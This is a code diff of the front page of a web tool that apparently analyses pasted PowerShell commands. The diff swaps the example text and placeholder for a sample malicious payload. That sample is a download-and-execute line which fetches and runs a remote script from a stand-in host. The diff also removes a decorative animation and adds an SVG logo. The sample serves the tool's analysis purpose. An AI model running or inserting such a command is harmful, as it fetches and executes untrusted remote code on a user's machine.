@@ -10,7 +10,6 @@ import { ErrorMessage, InfoMessage } from "./components/Messages";
 import CommandInput from "./components/CommandInput";
 import ThemedButton from "./components/ThemedButton";
 import AnalysisChat from "./components/AnalysisChat";
-import MatrixRain from "./components/MatrixRain";
 
 export default function Home() {
   const router = useRouter();
@@ -202,7 +201,6 @@ export default function Home() {
 
   return (
     <div className="flex h-screen overflow-hidden relative">
-      <MatrixRain />
       
       <div className="flex-shrink-0 relative z-10">
         <AnalysisChat />
@@ -210,23 +208,40 @@ export default function Home() {
       
     
       <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 md:p-8 overflow-hidden relative z-10">
-        <h1 className="text-2xl sm:text-3xl md:text-4xl font-mono font-bold mb-6 sm:mb-8 text-center px-2" style={{color: 'var(--accent)'}}>
-          powershell.exposed
-        </h1>
-        
-        <form onSubmit={handleAnalyze} className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
-          <div className="flex flex-col md:flex-row items-stretch md:items-center gap-4">
-            <div className="flex-1">
-              <CommandInput
-                value={command}
-                onChange={handleCommandChange}
-                onSubmit={() => handleAnalyze({ preventDefault: () => {} })}
-                placeholder="Type a PowerShell command (e.g., Get-Process, ls | sort, Start-Service -Name...) • Press Enter to evaluate"
-                error={error}
-              />
-            </div>
+        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
+          <form onSubmit={handleAnalyze}>
+            <div className="flex flex-col md:flex-row items-stretch md:items-center gap-4">
+              <div className="flex-1">
+                <h1 className="text-2xl sm:text-3xl md:text-4xl font-mono font-bold mb-6 sm:mb-8 text-center px-2 flex items-center justify-center gap-3" style={{color: 'var(--accent)'}}>
+                  <svg 
+                    viewBox="0 0 256 256" 
+                    xmlns="http://www.w3.org/2000/svg" 
+                    aria-label="powershell.exposed icon: ! >"
+                    className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12"
+                  >
+                    <defs>
+                      <mask id="cut3">
+                        <rect x="24" y="24" width="208" height="208" rx="28" fill="white"/>
+                        <line x1="86" y1="92" x2="86" y2="148" stroke="black" strokeWidth="20" strokeLinecap="round"/>
+                        <circle cx="86" cy="170" r="10" fill="black"/>
+                        <polyline points="120,100 172,128 120,156" fill="none"
+                          stroke="black" strokeWidth="24" strokeLinecap="round" strokeLinejoin="round"/>
+                      </mask>
+                    </defs>
+                    <rect x="24" y="24" width="208" height="208" rx="28" fill="#1CC76D" mask="url(#cut3)"/>
+                  </svg>
+                  powershell.exposed
+                </h1>
+                <CommandInput
+                  value={command}
+                  onChange={handleCommandChange}
+                  onSubmit={() => handleAnalyze({ preventDefault: () => {} })}
+                  placeholder="Type or paste a PS payload..."
+                  error={error}
+                />
+              </div>
             
-            <div className="flex-shrink-0">
+            <div className="flex-shrink-0 flex items-center">
               <ThemedButton
                 type="submit"
                 disabled={error !== "" || loading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
@@ -313,9 +328,12 @@ export default function Home() {
           )}
 
           <InfoMessage 
-            message={!error && command.trim() === "" ? "Examples: Get-Process | Where-Object CPU -gt 100 | Select Name, CPU" : ""}
+            message={!error && command.trim() === "" ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
+            clickable={!error && command.trim() === ""}
+            onClick={() => setCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
           />
         </form>
+        </div>
       </div>
     </div>
   );
